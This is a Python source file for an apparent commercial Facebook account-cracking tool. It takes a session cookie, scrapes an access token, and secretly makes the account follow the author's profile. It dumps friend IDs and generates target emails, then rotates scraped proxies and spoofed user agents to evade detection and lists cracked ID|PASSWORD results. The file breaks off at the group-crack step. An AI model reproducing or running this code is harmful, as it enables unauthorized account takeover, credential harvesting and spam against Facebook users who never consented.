import os
#------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
try:
    import rich
except ImportError:
    os.system('pip install rich')
from rich.console import Console
console = Console()
try:
    import licensing
except ImportError:
    console.print(f' {H2}• {U2}Sedang Menginstall Modul licensing{H2} •{P2}')
    os.system('pip install licensing')
try:
        import rich
except ImportError:
        console.print(f' {H2}• {U2}Sedang Menginstall Modul Rich {H2}•{P2}')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        console.print(f' {H2}• {U2}Sedang Menginstall Modul stdiomask {H2}•{P2}')
        os.system('pip install stdiomask')
try:
    import bs4
except ImportError:
    console.print(f' {H2}• {U2}Sedang Menginstall Modul bs4 {H2}•{P2}')
    os.system('pip install bs4')
#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid,calendar
from time import sleep
from datetime import date,datetime
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from licensing.models import *
from licensing.methods import Key, Helpers
from concurrent.futures import ThreadPoolExecutor as executor

#------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON=sol()
wa = Console()
prem = []
free=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,tokenku,uid,method,pwpluss,pwnya,tokenmu= [],[],0,0,0,[],[],[],[],[],[],[]
dia,ualu,ualuh,=[],[],[]
sys.stdout.write('\x1b]2; BMBF | Viper Brute\x07')
#------------------[ USER-AGENT ]-------------------#
try: 
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    Console().print(f' {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda');exit()
prox=open('.prox.txt','r').read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE USERAGENT ]---------- ###
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.0"
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	device = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269","vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935","SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN","Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G","E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322","Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a","RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	dev = device.split(" Build/")[0]
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua = f"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; id; CPH2387) U2/1.0.0 UCBrowser/9.9.0.543 Mobile [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;"
	if ua in prem:pass
	else:prem.append(ua)
	
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            free.append(ub)
    except:
        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.bbnew.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
try:
    file_color = open("data/theme_color","r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2,H2,K2])
    W2 = random.choice([K2,M2,K2])
    W3 = random.choice([H2,K2,M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color","r").read()
except FileNotFoundError:
    color_table = "#00FF00"

SE="[#9F9F9F]"
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom1 = ("Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]") 
kom2 = ("Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku") 
kom3 = ("Panutan Ku") 
kom4 = ("Pintar Banget") 
kom5 = ("Jadikan Aku Anak Buah Mu Bang @[100043537611609:]") 
kom6 = (" Izin Share Ya Bang\n-\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\nSemangat Ya Bang ❤") 
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d-%B-%Y")
#--> Pengkondisian Jam Untuk Salam Harian
def waktucok():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow
###----------[ CEK LISENSI ]---------- ###
def key():
    logoku();key = Console().input(f" {K}#{P} masukan lisensi : {H}")
    try:
        ses = requests.Session()
        asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyI2NjMxOTcyOCIsIlhVUE9xTFIvTTNQc0hSUm4rUDhSSitjUjhKd1JSQnpXZDVHUklxWEkiXQ==&ProductId=22574&Key=%s&Sign=True"%(key)).json()['licenseKey']['key']
        open("key.txt","w").write(key)
        Console().print(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server Facebook HACKFB",width=80,padding=(0,6),style=f"{color_table}"))
        time.sleep(4)
        login()
    except KeyError:
        Console().print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"))
        os.system("rm -rf key.txt")
        time.sleep(3)
        license()

###----------[ CEK LISENSI ]---------- ###
def cek():
    try:
        x=open("key.txt","r").read()
    except FileNotFoundError:
        license()
    try:
        x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI2NjMxOTcyOCIsIlhVUE9xTFIvTTNQc0hSUm4rUDhSSitjUjhKd1JSQnpXZDVHUklxWEkiXQ==&ProductId=22574&Key=%s"%(x)).json()['licenseKey']['key']
        login()
    except KeyError:
        Console().print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"))
        os.system("rm -rf key.txt")
        
        license()

###----------[ MASUK LISENSI ]---------- ###
def key():
    Console().print(Panel(f"{P2}silahkan masukan lisensi tools agar bisa masuk ke tools HACKFBV3",width=80,padding=(0,2),style=f"{color_table}"))
    key = Console().input(f" {H2}•{P2} masukan lisensi : ")
    try:
        ses = requests.Session()
        asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyI2NjMxOTcyOCIsIlhVUE9xTFIvTTNQc0hSUm4rUDhSSitjUjhKd1JSQnpXZDVHUklxWEkiXQ==&ProductId=22574&Key=%s&Sign=True"%(key)).json()['licenseKey']['key']
        open("key.txt","w").write(key)
        Console().print(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server HACKFB",width=80,padding=(0,9),style=f"{color_table}"))
        time.sleep(3)
        login()
    except KeyError:
        Console().print(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"))
        time.sleep(3)
        license()
###----------[ CEK LISENSI ]---------- ###				
def cek():
    try:
        x=open("key.txt","r").read()
    except FileNotFoundError:
        license()
    try:
        x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI2NjMxOTcyOCIsIlhVUE9xTFIvTTNQc0hSUm4rUDhSSitjUjhKd1JSQnpXZDVHUklxWEkiXQ==&ProductId=22574&Key=%s"%(x)).json()['licenseKey']['key']
        login()
    except KeyError:
        Console().print(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"))
        os.system("rm -rf key.txt")
        time.sleep(3)
        license()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    Console().print(Panel(f"[{color_text}01{P2}]. 1 minggu max pemakaian 1 device\n[{color_text}02{P2}]. 1 bulan max pemakaian 5 device\n[{color_text}03{P2}]. open source full update",width=80,style=f"{color_table}"))
    zxc = console.input(f" {H2}•{P2} pilih lisensi : ")
    if zxc in [""]:
        Console().print(f" {H2}•{P2} pilih yang bener broo jangan kosong")
        time.sleep(3)
        cek_lisensi_aktif()
    elif zxc in ["1","01"]:
        Console().print(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+62895386194665?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+minggu")
        time.sleep(2)
        exit()
    elif zxc in ["2","02"]:
        Console().print(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+62895386194665?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+bulan")
        time.sleep(2)
        exit()
    elif zxc in ["3","03"]:
        Console().print(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+62895386194665?text=assalamualaikum+bang+mau+beli+lisensi+facebook+full+source")
        time.sleep(2)
        exit()
    else:
        Console().print(f" {H2}•{P2} ngetik apaan lu ngab")
        time.sleep(3)
        cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
    try:
        xz = open("key.txt","r").read()
    except FileNotFoundError:
        license()
        os.system("clear")
        cek()
 
 
def maintenance():
    os.system('clear')
    print()
    print()
    Console().print('[bold green] MOHON MAAF UNTUK SEKARANG SCRIPT DALAM TAHAP PERBAIKAN',width=80,style="bold cyan")
    print()
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def logoku():
    prints(Panel(f"""\t{P2}╔╗──╔══╦═══╦═══╦═╗─╔╦═══╦══╗
\t║║──╚╣╠╣╔═╗║╔══╣║╚╗║║╔═╗╠╣╠╝
\t║║───║║║╚══╣╚══╣╔╗╚╝║╚══╗║║
\t║║─╔╗║║╚══╗║╔══╣║╚╗║╠══╗║║║
\t║╚═╝╠╣╠╣╚═╝║╚══╣║─║║║╚═╝╠╣╠╗
\t╚═══╩══╩═══╩═══╩╝─╚═╩═══╩══╝""",title="Selamat Datang",width=80,padding=(0,4),style=f"{color_panel}"))
                 
def banner():
    Console().print(Panel("""
[bold red]███████████████████████    
[bold red]███████████████████████ [bold yellow]Github : [bold green]
[bold red]███████████████████████ [bold yellow]Wa     : [bold green]+62895386194***
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",width=60,style=f"{color_panel}"))


        
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
    os.system('clear')
    banner()
    Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie (Recomend)\n[[bold cyan]02[bold white]] Keluar
    """,width=60, style=f"{color_panel}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (LOGIN) [bold green]<[bold yellow]<[bold red]<"))
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ['1','01']:
        login_lagi334()
    elif bryn in ['2','02']:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end='\r')
        time.sleep(5)
        login()
        
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again")
            exit()
    except IOError:
        login123()

def login_lagi334():
    cokie = {'cookie':input("cookie: ")}
    try:
        req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
        act = re.search('act=(\d+)',str(req)).group(1)
        res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
        xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
        open('.cok.txt','w').write(cokie.get('cookie'))
        open('.token.txt','w').write(xyz)
        follow_me(cokie)
        exit(os.system('python %s'%(sys.argv[0])))
    except Exception as e:
        exit(e)
def follow_me(xyz): # YANG GAK GANTI BOT FOLLOW GANTENG
    from bs4 import BeautifulSoup as BSP
    try:
        req = BSP(requests.get('https://m.facebook.com/100043537611609', cookies = xyz).text,'html.parser')
        for i in req.find_all('a', href=True):
            if '/a/subscribe.php?' in str(i.get('href')):
                r = requests.get('https://m.facebook.com%s'%(i['href']), cookies=xyz).text
    except:pass

#----------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
    try:
        token = open('.token.txt','r').read()
        cookie = open('.cok.txt','r').read()
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
        os.system('rm -rf .token.txt && rm -rf .cok.txt')
        time.sleep(3)
        login()
    try:
        name = requests.get('https://graph.facebook.com/%s?access_token=%s'%('me',token), cookies = {'cookie':cookie}).json()['name']
    except KeyError:login()
    os.system('clear')
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    prints(Panel(f"{H2}{waktucok()}",padding=(0,22),width=60,style=f"{color_panel}"))
    dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(panel(f'{P2}Name   : {H2}{my_name}\n{P2}Idz    : {H2}{my_id}\n{P2}Waktu  : {H2}{waktucok()}',width=30,style=f"{color_panel}"))
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack pencarian nama
[{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
[{color_text}03{P2}]. crack dari Grup        [{color_text}07{P2}]. crack dari File
[{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari opsi CP""",width=60,style=f"{color_panel}"))
    prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=60,style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ['']:
        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
    elif HaHi in ['1','01']:
        publik()
    elif HaHi in ['2','02']:
        massal()
    elif HaHi in ['3','03']:
        grup()
    elif HaHi in ['4','04']:
        crack_email()
    elif HaHi in ['5','05']:
        maintenance()
    elif HaHi in ['6','06']:
        publikv2()
    elif HaHi in ["7","07"]:
        crack_file()
    elif HaHi in ["8","08"]:
        file_cp()
    
    ###----------[ PINDAH KE MENU BOT ]---------- ###
    elif HaHi in["BOT","Bot","bot"]:
        botdata().menu()
    elif HaHi in["LAIN","Lain","lain"]:
        Lain(cookie).menu()
    else:
        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")

dump=[]
def publik():
    tk = open('.token.txt','r').read()
    ck = open('.cok.txt','r').read()
    dta = {'access_token':tk,'after':None}
    url = 'https://graph.facebook.com/v18.0/%s/friends'
    uid = input('\n%s[%s!%s] Gunakan Tanda Koma Buat Pemisahan Id\n[%s?%s] Masukan Id : %s'%(N,M,N,M,N,H))
    for xxx in uid.split(','):
        exec_dump(dta, url, xxx, dump, ck)
    print('')
    setting()

def exec_dump(params, host, user, array, coki):
    try:
        req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
        for xyz in req['data']:
            uid = '%s|%s'%(xyz['id'],xyz['name'])
            if uid not in array:array.append(uid)
            print('%s[%s!%s] Success Medapatkan %s Id '%(N,M,N,len(array)),end='\r')
            sys.stdout.flush()
        if 'paging' in str(req):
           after = req['paging']['cursors']['after']
           params.update({'after': after})
           exec_dump(params, host, user, array, coki)
    except:pass
    return array
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
    rc = random.choice
    rr = random.randint
    xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
    blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
    global ok , cp
    Console().print(panel(f'{P2}Masukan Nama Email Yang Ingin Di Crack\nContoh : {H2}Adi, Dimas, Andi',width=60,style=f"{color_panel}"))
    nama = console.input(f" {H2}• {P2}Masukan Nama Target : ")
    if ',' in str(nama):
        console.print(f" [+] Masukan Nama, Jangan Kosong Ngab")
        time.sleep(3);exit()
    Console().print(panel(f'{P2}Masukan Nama Domain\nContoh : {H2} @Gmail.com, @Yahoo.com, Dll',width=60,style=f"{color_panel}"))
    doma = console.input(f" {H2}• {P2}Masukan Nama Domain : ")
    if '@' not in str(doma) or '.com' not in str(doma):
        console.print(f" [+] Masukan Domain Dengan Benar")
        time.sleep(3);exit()
    jumlah = console.input(f" {H2}• {P2}Total Ingin Dump : ")
    for xyz in range(int(jumlah)):
        A = nama
        B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
        C = doma
        D = f'{A}{str(rc(B))}{C}'
        if D in id:pass
        else:id.append(D+'|'+nama)
        if len(id)==999999:setting()
        sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
        time.sleep(0.0000003)
    print("\r")
    setting()
##------------[Crack File]------------##
def crack_file():
    try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
    except FileNotFoundError:
        console.print(f' {H2}• {P2}File Tidak Ditemukan ')
        time.sleep(2)
        exit()
    if len(vin)==0:
        console.print(f' {H2}• {P2}Kamu Tidak Memiliki File Dump ')
        time.sleep(2)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:hem = open('/sdcard/RUDAL-DUMP/'+isi,'r').readlines()
            except:continue
            cih+=1
            if cih<100:
                nom = ''+str(cih)
                lol.update({str(cih):str(isi)})
                lol.update({nom:str(isi)})
                console.print(Panel(f'{H2}• {P2}%s. %s    ──>   %s Idz '%(nom,isi,len(hem)),width=80,style=f"{color_panel}"))
            else:
                lol.update({str(cih):str(isi)})
                print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
                console.print(Panel(f'{H2}• {P2}%s. %s    ──>   %s Idz '%(cih,isi,len(hem))))
        geeh = console.input(f' {H2}• {P2} Pilih : ')
        try:geh = lol[geeh]
        except KeyError:
            console.print(f' {H2}• {P2} Pilih Yang Bener Kontol ')
            time.sleep(3)
            exit()
        try:lin = open('/sdcard/RUDAL-DUMP/'+geh,'r').read().splitlines()
        except:
            console.print(f' {H2}• {P2} File Tidak Ditemukan, Coba Lagi Nanti ')
            time.sleep(2)
            exit()
        for xid in lin:
            id.append(xid)
        setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
    Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',subtitle="╭───", subtitle_align="left",width=80,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold cyan"))
    kz = Console().input(f"[bold cyan]   ╰─> ")
    if kz in ['2','02']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
            time.sleep(3)
            exit()
        if len(vin)==0:
            Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Memiliki Hasil CP ")
            time.sleep(4)
            exit()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
                else:
                    lol.update({str(cih):str(isi)})
                    Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
            geeh = Console(width=80, style="bold cyan").input(f'[bold cyan]   ╰─> ')
            try:geh = lol[geeh]
            except KeyError:
                Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh ")
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
                time.sleep(4)
                exit()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                Console(width=80, style="bold cyan").print(panel(f'[bold yellow] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
                nocp +=1
            Console().input('[bold yellow][ Klik Enter For Exit ]')
            exit()
    elif kz in ['1','01']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
            time.sleep(4)
            exit()
        if len(vin)==0:
            Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Mempunyai File OK ")
            time.sleep(4)
            exit()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<80:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
                else:
                    lol.update({str(cih):str(isi)})
                    Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
            geeh = Console().input("[bold cyan]   ╰─> ")
            try:geh = lol[geeh]
            except KeyError:
                Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
                time.sleep(4)
                exit()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                Console(width=80, style="bold cyan").print(panel(f'[bold green] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
                nocp +=1
            Console().input('[bold yellow][ Klik Enter For Exit ]')
            exit()
    else:
        Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
        exit()

#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
    print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
    input(f'{x}>> [ {m}Klik Enter {x}] ')
    print('')
    pass
    setting()
def grup():
    print('')
    id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
